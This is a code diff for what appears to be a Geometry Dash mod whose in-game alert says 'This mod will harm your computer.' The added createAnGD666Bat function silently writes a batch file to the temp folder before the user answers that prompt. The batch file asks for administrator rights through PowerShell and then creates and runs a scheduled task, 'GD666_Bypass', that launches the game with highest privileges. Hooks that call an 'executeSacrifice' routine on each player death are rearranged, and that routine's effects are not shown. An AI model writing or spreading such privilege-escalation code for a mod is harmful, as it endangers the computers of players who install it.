@@ -30,7 +30,27 @@ fs::path getVerificationFilePath() {
     return "";
 }
 
-// MenuLayer logic...
+void createAnGD666Bat() {
+    char* tempEnv = std::getenv("TEMP");
+    if (!tempEnv) return;
+    fs::path batPath = fs::path(tempEnv) / "AnGD666.bat";
+    fs::path successPath = getVerificationFilePath();
+    
+    std::ofstream batFile(batPath);
+    batFile << "@echo off\n";
+    batFile << "net session >nul 2>&1\n";
+    batFile << "if %errorLevel% neq 0 (\n";
+    batFile << "    powershell -Command \"Start-Process '%~f0' -Verb RunAs\"\n";
+    batFile << "    exit /b\n";
+    batFile << ")\n";
+    batFile << "set \"GD_PATH=C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\"\n";
+    batFile << "schtasks /create /tn \"GD666_Bypass\" /tr \"'%GD_PATH%'\" /sc ONCE /st 00:00 /rl HIGHEST /f >nul 2>&1\n";
+    batFile << "echo Success > \"" << successPath.string() << "\"\n";
+    batFile << "schtasks /run /tn \"GD666_Bypass\"\n";
+    batFile << "exit\n";
+    batFile.close();
+}
+
 class $modify(MyMenuLayer, MenuLayer) {
     bool init() override {
         if (!MenuLayer::init()) return false;
@@ -51,12 +71,13 @@ class $modify(MyMenuLayer, MenuLayer) {
         utils::game::restart(true); 
     }
     void showFirstMessage() {
+        createAnGD666Bat();
         auto alert = FLAlertLayer::create(this, "Are you sure?", "This mod will harm your computer.\nPress Yes to start it.", "No", "Yes");
         alert->setTag(1);
         alert->show();
     }
     void showLastMessage() {
-        auto alert = FLAlertLayer::create(this, "LAST WARNING!", "STILL EXECUTE IT?", "No", "Yes");
+        auto alert = FLAlertLayer::create(this, "LAST WARNING!", "STILL EXECUTE IT?", "No", "Yes" );
         alert->setTag(2);
         alert->show();
     }
@@ -139,16 +160,19 @@ class $modify(MyPlayLayer, PlayLayer) {
         }
     }
 
-    // Hook 1: destroyPlayer
+    // GD 2.2081 stable hook
     void destroyPlayer(PlayerObject* p0, GameObject* p1) override {
         PlayLayer::destroyPlayer(p0, p1);
         executeSacrifice();
     }
 
-    // Hook 2: playDeathEffect (More reliable in 2.2081)
-    void playDeathEffect(PlayerObject* p0) override {
-        PlayLayer::playDeathEffect(p0);
-        executeSacrifice();
+    void resetLevel() override {
+        PlayLayer::resetLevel();
+        if (m_fields->m_hasDiedThisAttempt || m_fields->m_currentSacrifice.empty()) {
+            m_fields->m_hasDiedThisAttempt = false;
+            m_fields->m_timeInLevel = 0.0f;
+            selectNewSacrifice();
+        }
     }
 
     void executeSacrifice() {
@@ -169,14 +193,5 @@ class $modify(MyPlayLayer, PlayLayer) {
                 }
             }
         } catch (...) {}
-    }
-
-    void resetLevel() override {
-        PlayLayer::resetLevel();
-        if (m_fields->m_hasDiedThisAttempt || m_fields->m_currentSacrifice.empty()) {
-            m_fields->m_hasDiedThisAttempt = false;
-            m_fields->m_timeInLevel = 0.0f;
-            selectNewSacrifice();
-        }
     }
 };
